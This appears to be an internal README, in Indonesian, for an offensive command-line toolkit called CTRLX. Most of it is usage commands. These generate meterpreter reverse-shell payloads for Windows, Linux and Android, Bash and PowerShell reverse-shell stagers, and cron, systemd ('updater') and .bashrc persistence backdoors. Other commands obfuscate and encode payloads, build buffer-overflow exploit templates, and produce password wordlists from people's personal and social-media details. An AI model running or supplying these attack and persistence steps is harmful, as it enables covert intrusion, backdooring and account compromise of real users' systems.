# 📘 README INTERNAL – CTRLX Toolkit

---

## Tentang

CTRLX adalah kumpulan tools baris perintah (CLI) berbasis Python yang dirancang untuk eksploitasi, persistence, obfuscation, dan otomasi konfigurasi. Tools ini disusun secara modular agar fleksibel digunakan dalam lingkungan terminal di sistem Linux seperti Kali Linux.
Setiap tools dapat dijalankan secara independen berdasarkan kategorinya, dan menghasilkan output yang siap digunakan dalam proses lanjutan di sistem.

---

## Struktur

```
ctrlx/
├── axt/    # Payload & Shellcode Generator
├── rda/    # Persistence & Backdoor Tools
├── zkf/    # Exploit Toolkit & Shellcode Formatter
├── qrn/    # Wordlist & OSINT Generator
├── xch/    # Obfuscator & Encoder
├── cfg/    # Config & Command File Generator
├── boot/   # Launcher CLI (viper.py)
├── ctrlx.py  # Main entry point
```

---

## Instalasi

Jalankan perintah berikut dari direktori root `ctrlx`:

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Penggunaan Umum

```bash
python3 ctrlx.py <kategori> --type <tool> [opsi]
```

Contoh:

```bash
python3 ctrlx.py axt --type w0x --lhost 127.0.0.1 --lport 4444 --format exe --save
```

Untuk melihat opsi parameter setiap tools:

```bash
python3 ctrlx.py <kategori> --type <tool> --help
```

---

## axt/ — Payload & Shellcode Generator

### w0x.py – Windows Payload (.exe)

Menghasilkan payload `windows/meterpreter/reverse_tcp` dengan msfvenom dan menyimpannya sebagai file `.exe`.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py axt --type w0x --lhost 192.168.1.10 --lport 4444 --format exe --save
```

---

### l0x.py – Linux Payload (.elf)

Payload untuk `linux/x86/meterpreter/reverse_tcp` menggunakan msfvenom, format `.elf`.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py axt --type l0x --lhost 192.168.1.10 --lport 4444 --format elf --save
```

---

### axk.py – Android Payload (.apk)

Payload berbasis `android/meterpreter/reverse_tcp`, output berupa `.apk`.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py axt --type axk --lhost 192.168.1.10 --lport 4444 --save
```

---

### s1n.py – Shell Stager

Menghasilkan one-liner reverse shell untuk Bash (`bsh`) dan PowerShell (`ps1`).

**Contoh Penggunaan:**

```bash
python3 ctrlx.py axt --type s1n --platform bsh --lhost 192.168.1.10 --lport 9001 --save
```

---

### mux.py – Payload Formatter

Memformat payload menjadi output siap embed (`py`, `c`, `ps1`, atau `raw`).

**Contoh Penggunaan:**

```bash
python3 ctrlx.py axt --type mux --input "bash -i ..." --format c --save
```

---

## rda/ — Persistence & Backdoor Tools

### c9n.py – Cronjob Backdoor

Membuat entry cron job untuk menjalankan file payload secara periodik.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py rda --type c9n --command "/home/user/payload.sh" --interval 5 --save
```

---

### sy7d.py – Systemd Service Creator

Membuat file `.service` untuk systemd agar payload dijalankan saat boot.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py rda --type sy7d --exec /home/user/payload --name updater --save
```

---

### bsh3.py – Bashrc Hijacker

Menyisipkan payload ke `.bashrc` agar dijalankan saat user login shell.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py rda --type bsh3 --command "/home/user/payload.sh" --save
```

---

### vlt.py – File Name Obfuscator

Mengacak dan menyembunyikan nama file payload.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py rda --type vlt --input payload.sh --save
```

---

## zkf/ — Exploitation & Shellcode Tools

### px0.py – Pattern Generator / Offset Checker

Menghasilkan cyclic pattern dan mengecek offset dari input tertentu.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py zkf --type px0 --length 300 --save
python3 ctrlx.py zkf --type px0 --offset Aa0Aa1Aa2Aa3
```

---

### e3c.py – Exploit Template (C)

Template exploit buffer overflow berbasis bahasa C.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py zkf --type e3c --offset 260 --eip 0xdeadbeef --shellcode "\\x90\\x90\\xcc" --save
```

---

### e3p.py – Exploit Template (Python)

Template exploit buffer overflow berbasis Python 3.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py zkf --type e3p --offset 260 --eip 0xdeadbeef --shellcode "\\x90\\x90\\xcc" --save
```

---

### sch.py – Shellcode Formatter

Memformat shellcode untuk embed ke berbagai bahasa.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py zkf --type sch --shellcode "\\x90\\x90\\xcc" --lang c
```

---

### rop.py – Gadget Finder (Simulasi)

Mencari ROP gadget sederhana dari file ELF dengan string search.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py zkf --type rop --binary ./vuln --search "pop rdi" --base-addr 0x400000 --gadgets 3
```

---

## qrn/ — Wordlist & OSINT Generator

### crh.py – Custom Crunch Generator

Menghasilkan kombinasi karakter berdasarkan panjang tertentu.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py qrn --type crh --chars abc123 --min 3 --max 4 --save
```

---

### cew.py – CeWL-style Scraper

Mengambil keyword dari halaman website untuk membuat wordlist.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py qrn --type cew --url https://example.com --min 5 --save
```

---

### cpp.py – Profil Wordlist Generator

Menghasilkan kombinasi kata dari data pribadi seperti nama, tahun lahir, dan nama hewan peliharaan.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py qrn --type cpp --name budi --birth 2003 --pet dogi --save
```

---

### owp.py – OSINT Wordlist Creator

Wordlist berdasarkan nama pengguna, platform, dan informasi lokasi.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py qrn --type owp --user nopal --platform instagram --info tangerang --save
```

---

## xch/ — Obfuscator & Encoder

### xor.py – XOR Encoder

Mengenkripsi string dengan XOR satu karakter.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py xch --type xor --input "bash ..." --key 88 --save
```

---

### b64.py – Base64 Encoder

Mengubah string menjadi encoded base64.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py xch --type b64 --input "bash ..." --save
```

---

### hx0.py – Hex Encoder

Membuat hex-escaped string seperti `\xNN`.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py xch --type hx0 --input "bash ..." --save
```

---

### snk.py – Byte Chunker / Shuffler

Memecah atau mengacak byte dari input string.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py xch --type snk --input "bash ..." --chunk 6
python3 ctrlx.py xch --type snk --input "bash ..." --shuffle
```

---

### fmt.py – Format Generator

Mengubah payload ke format siap embed di berbagai bahasa.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py xch --type fmt --input "\\x90\\x90\\xcc" --format py
```

---

## cfg/ — Config & Command Builder

### msp.py – Metasploit RC Generator

Membuat file `.rc` handler metasploit.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py cfg --type msp --payload windows/meterpreter/reverse_tcp --lhost 127.0.0.1 --lport 4444 --save
```

---

### nmp.py – Nmap Command Generator

Menghasilkan command `nmap` berdasarkan input target.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py cfg --type nmp --target 192.168.1.0/24 --scan syn --script vuln --save
```

---

### gen.py – Multi-line Config Generator

Membuat file konfigurasi dengan banyak baris yang ditentukan.

**Contoh Penggunaan:**

```bash
python3 ctrlx.py cfg --type gen --line "sudo apt update" --line "sudo apt install nmap" --save
```

---

## Penutup

CTRLX disusun agar dapat menjadi basis kerja bagi para pengembang alat pengujian keamanan dan praktisi keamanan informasi. Seluruh tools dirancang modular dan bisa dijalankan langsung melalui command line tanpa tambahan integrasi eksternal.

Dokumentasi ini hanya ditujukan untuk referensi internal.
